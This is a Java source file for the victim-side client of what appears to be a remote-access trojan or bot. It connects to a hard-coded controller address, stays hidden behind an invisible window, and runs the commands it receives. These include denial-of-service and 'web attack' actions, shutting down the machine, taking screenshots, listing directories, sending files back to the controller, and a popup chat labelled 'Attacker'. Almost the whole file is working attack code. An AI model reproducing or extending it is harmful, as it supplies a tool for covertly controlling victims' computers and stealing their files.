import java.net.*;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

import java.io.*;
public class Client {
	
	public void ConnectToServer(){
		
		JFrame j=new JFrame();
		j.setAlwaysOnTop(true);
		j.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		j.setVisible(true);
		j.setVisible(false);
		
		try{
			int port = 25001;
			String ip = "172.16.60.43";
			Socket s = new Socket(ip,port);
			DataInputStream din = new DataInputStream(s.getInputStream());
			DataOutputStream dout = new DataOutputStream(s.getOutputStream());
			BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
			AttackOperations op = new AttackOperations();
			String send="",recive="";
			
			while(!recive.equals("end")){
				
				recive = din.readUTF();
				
				if(recive.equals("dos")){
					send=op.dosAttack();
					dout.writeUTF(send);
					dout.flush();
				}
				
				else if(recive.equals("shut")){
					send=op.shutDown();
					dout.writeUTF(send);
					dout.flush();
				}
				else if(recive.equals("shock")){
					send=op.shockAttack();
					dout.writeUTF(send);
					dout.flush();
				}
				else if(recive.equals("light")){
					send=op.lightAttack();
					dout.writeUTF(send);
					dout.flush();
				}
				else if(recive.equals("chat")){
					try{
						//chat
						dout.writeUTF("chat connected ..");
						
						while(!recive.equals("stop")){
							String temp = "Attacker :";
							recive = din.readUTF();
							if(recive.equals("stop")){
								break;
							}
							temp+=recive;
							send = JOptionPane.showInputDialog(j,temp);
							dout.writeUTF(send);
						}
						
						dout.writeUTF("chat ended ..");
						dout.flush();
						
						
					}
					catch (Exception e){
						dout.writeUTF("stop");
						dout.flush();
					}
				}
				
				else if(recive.startsWith("path")){
					String arr[] = recive.split("`");
					recive = arr[1];
					send = op.screenShot(recive);
					dout.writeUTF(send);
					dout.flush();
				}
				
				else if(recive.startsWith("dir")){
					String arr[] = recive.split("`");
					recive = arr[1];
					System.out.println(recive);
					send = op.fileExplore(recive);
					dout.writeUTF(send);
					dout.flush();
				}
				
				else if(recive.startsWith("download")){
					String arr[] = recive.split("`");
					recive = arr[1];
					op.fileDownload(recive,dout);
				}
				
				else if(recive.length()>7){
					send=op.webAttack(recive);
					dout.writeUTF(send);
					dout.flush();
				}
				
				else {
					dout.writeUTF("something wrong !!");
					dout.flush();
				}
				

			}
			
			s.close();
		}
		catch(Exception e){
			System.out.println("error at client :"+e.getMessage());
		}
	}
}
